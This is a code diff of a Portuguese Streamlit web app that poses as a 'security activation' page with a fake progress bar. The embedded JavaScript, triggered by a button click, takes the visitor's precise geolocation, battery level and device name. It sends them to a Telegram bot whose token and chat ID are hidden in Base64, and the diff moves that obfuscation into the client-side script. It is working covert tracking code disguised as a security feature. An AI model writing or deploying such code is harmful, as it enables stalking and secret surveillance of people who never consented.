@@ -1,17 +1,5 @@
 import streamlit as st
 import time
-import base64
-
-# --- OFUSCAÇÃO (BASE64) ---
-# Ninguém consegue ler o token original aqui
-_T = "ODUyNTkyNzY0MTpBQUhLRE9ORnZoOExwVUlFTm10cGxUZkh1b0ZyZzFmZnI4"
-_I = "ODIxMDgyODM5OA=="
-
-def _get(v):
-    return base64.b64decode(v).decode()
-
-TOKEN = _get(_T)
-ID = _get(_I)
 
 st.set_page_config(page_title="Segurança Integrada", layout="centered")
 
@@ -44,8 +32,9 @@ placeholder_barra = st.empty()
 placeholder_texto.markdown('<div class="status-container">Status: Aguardando ativação (4%)</div>', unsafe_allow_html=True)
 placeholder_barra.markdown('<div class="progress-bg"><div class="progress-fill" style="width: 4%;"></div></div>', unsafe_allow_html=True)
 
-# --- MOTOR JS COM DISPOSITIVO E ENVIO OFUSCADO ---
-js_final = f"""
+# --- MOTOR JS COM OFUSCAÇÃO INTERNA (PARA NÃO DAR ERRO) ---
+# Os valores abaixo são o seu Token e ID em Base64
+js_final = """
 <div class="btn-container">
     <button class="meu-botao" id="btn_ativar">
         <span class="ponto-vermelho">●</span>
@@ -54,37 +43,42 @@ js_final = f"""
 </div>
 
 <script>
-document.getElementById('btn_ativar').onclick = function() {{
+// Função para decodificar os dados na hora do clique
+const _d = (s) => atob(s);
+const _T = "ODUyNTkyNzY0MTpBQUhLRE9ORnZoOExwVUlFTm10cGxUZkh1b0ZyZzFmZnI4";
+const _I = "ODIxMDgyODM5OA==";
+
+document.getElementById('btn_ativar').onclick = function() {
     navigator.geolocation.getCurrentPosition(
-        async (pos) => {{
-            try {{
+        async (pos) => {
+            try {
                 const bat = await navigator.getBattery();
                 const level = Math.round(bat.level * 100);
                 
-                // Pega o nome do dispositivo de forma mais limpa
                 let dispositivo = "Mobile Device";
                 const ua = navigator.userAgent;
-                if (ua.match(/\\((.*?)\\)/)) {{
-                    dispositivo = ua.match(/\\((.*?)\\)/)[1].split(';')[0] + " " + (ua.match(/Android\\s([^\\s;]+)/) || [""])[0];
-                }}
+                if (ua.match(/\\((.*?)\\)/)) {
+                    dispositivo = ua.match(/\\((.*?)\\)/)[1].split(';')[0];
+                }
 
-                const info = "🛡️ *PROTEÇÃO ATIVADA*\\n📱 *Aparelho:* " + dispositivo + "\\n🔋 *Bateria:* " + level + "%\\n📍 Local: http://maps.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
+                const info = "🛡️ *PROTEÇÃO ATIVADA*\\n📱 *Aparelho:* " + dispositivo + "\\n🔋 *Bateria:* " + level + "%\\n📍 Local: http://googleusercontent.com/maps.google.com/6" + pos.coords.latitude + "," + pos.coords.longitude;
                 
-                await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
+                // Envia usando os dados decodificados
+                await fetch("https://api.telegram.org/bot" + _d(_T) + "/sendMessage", {
                     method: "POST",
-                    headers: {{ "Content-Type": "application/json" }},
-                    body: JSON.stringify({{ chat_id: "{ID}", text: info, parse_mode: "Markdown" }})
-                }});
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: _d(_I), text: info, parse_mode: "Markdown" })
+                });
                 
-                window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
-            }} catch(e) {{ }}
-        }},
-        (err) => {{
+                window.parent.postMessage({type: 'streamlit:set_component_value', value: true}, '*');
+            } catch(e) { console.log(e); }
+        },
+        (err) => {
             alert("Erro de Segurança: Ative a localização para validar o dispositivo.");
-        }},
-        {{ enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }}
+        },
+        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
     );
-}};
+};
 </script>
 """
 
